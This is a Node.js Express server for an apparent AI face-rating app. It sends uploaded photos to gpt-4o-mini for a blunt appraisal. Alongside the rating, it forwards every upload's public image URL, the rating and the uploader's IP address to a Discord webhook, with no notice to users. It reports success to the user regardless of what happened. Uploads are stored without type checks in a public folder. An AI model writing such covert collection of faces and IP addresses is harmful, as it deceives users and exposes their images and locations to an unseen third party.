import express from "express";
import multer from "multer";
import fs from "fs";
import path from "path";
import axios from "axios";
import OpenAI from "openai";

const app = express();
const PORT = process.env.PORT || 10000;

const openai = new OpenAI({
  apiKey: process.env.OPENAI_API_KEY,
});

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

// ===== uploads 폴더 보장 =====
const uploadDir = path.join(process.cwd(), "public/uploads");
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir, { recursive: true });
}

// ===== multer 설정 =====
const storage = multer.diskStorage({
  destination: uploadDir,
  filename: (_, file, cb) => {
    const ext = path.extname(file.originalname);
    cb(null, Date.now() + ext);
  },
});

const upload = multer({ storage });

// ===== 정적 파일 =====
app.use(express.static("public"));

// ===== 업로드 엔드포인트 =====
app.post("/upload", upload.single("photo"), async (req, res) => {
  const filePath = req.file.path;
  const imageUrl = `${req.protocol}://${req.get("host")}/uploads/${path.basename(filePath)}`;

  let aiResult = "AI 평가 실패 (모델 응답 없음)";

  // ===== 1️⃣ AI 얼굴 평가 시도 =====
  try {
    const response = await openai.chat.completions.create({
      model: "gpt-4o-mini",
      messages: [
        {
          role: "system",
          content:
            "너는 얼굴을 냉정하고 솔직하게 평가하는 얼평 전문가다. 과장하지 말고 보이는 대로 말해라.",
        },
        {
          role: "user",
          content: [
            { type: "text", text: "이 얼굴을 솔직하게 평가해줘." },
            {
              type: "image_url",
              image_url: { url: imageUrl },
            },
          ],
        },
      ],
    });

    aiResult = response.choices[0].message.content;
  } catch (err) {
    console.error("AI 평가 실패:", err.message);
  }

  // ===== 2️⃣ Discord로 무조건 전송 =====
  try {
    await axios.post(DISCORD_WEBHOOK_URL, {
      username: "AI 얼굴 평가 봇",
      embeds: [
        {
          title: "📸 얼굴 업로드 감지",
          image: { url: imageUrl },
          fields: [
            {
              name: "🧠 AI 평가",
              value: aiResult.slice(0, 1000),
            },
            {
              name: "🌐 업로드 IP",
              value: req.headers["x-forwarded-for"] || req.socket.remoteAddress,
            },
          ],
          timestamp: new Date(),
        },
      ],
    });
  } catch (err) {
    console.error("Discord 전송 실패:", err.message);
  }

  // ===== 3️⃣ 유저 응답 (무조건 성공처럼) =====
  res.json({
    success: true,
    result: aiResult,
  });
});

// ===== 서버 시작 =====
app.listen(PORT, () => {
  console.log(`🔥 Server running on port ${PORT}`);
});
